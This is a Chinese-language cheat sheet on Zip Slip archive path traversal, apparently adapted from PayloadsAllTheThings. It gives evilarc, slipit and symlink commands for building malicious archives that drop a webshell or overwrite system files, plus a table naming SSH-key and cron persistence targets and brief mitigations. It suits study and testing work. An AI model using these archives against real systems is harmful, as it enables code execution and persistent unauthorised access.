# Zip Slip - Zip Slip漏洞

[SEARCH_KEYWORDS]
漏洞类型: Zip Slip Directory Traversal Archive Extraction 文件覆盖
攻击类型: Remote Code Execution File Overwrite Arbitrary File Write
关键词: zip tar jar war cpio apk rar 7z archive extraction traversal
技术: Directory Traversal Path Traversal Archive Manipulation
格式: ZIP TAR JAR WAR CPIO APK RAR 7Z

[CONTENT]

## Zip Slip概述

Zip Slip漏洞利用包含目录遍历文件名（如../../shell.php）的特制归档文件。攻击者可以覆盖可执行文件，实现远程命令执行。

## 受影响格式

- ZIP
- TAR
- JAR
- WAR
- CPIO
- APK
- RAR
- 7Z

## 攻击原理

攻击者创建包含目录遍历路径的归档文件：

```ps1
malicious.zip
  ├── ../../../../etc/passwd
  ├── ../../../../usr/local/bin/malicious_script.sh
  ├── ../../../var/www/html/shell.php
```

当易受攻击的应用程序解压时，文件被写入预期目录之外的位置。

## 利用技术

### 使用evilarc

```python
python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
```

参数说明：
- `-o` : 操作系统类型（unix/windows）
- `-f` : 输出文件名
- `-p` : 目标路径
- `-d` : 遍历深度

### 创建符号链接

```ps1
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```

### 使用slipit

```ps1
slipit --depth 5 --prefix "../../../var/www/html/" shell.php
```

## 攻击场景

| 场景 | 目标文件 | 影响 |
|------|----------|------|
| RCE | .php, .jsp, .aspx | Webshell上传 |
| 配置覆盖 | config.php, settings.py | 应用配置篡改 |
| 系统文件 | /etc/passwd, /etc/shadow | 系统破坏 |
| SSH后门 | ~/.ssh/authorized_keys | 持久化访问 |
| Cron任务 | /etc/cron.d/ | 定时执行 |

## 工具

- evilarc - 创建tar/zip目录遍历归档
- slipit - ZipSlip归档创建工具

## 防护措施

1. 解压前验证文件路径
2. 使用安全的解压库
3. 限制解压目录权限
4. 过滤`../`序列

## 参考文档

原始来源: PayloadsAllTheThings/Zip Slip/README.md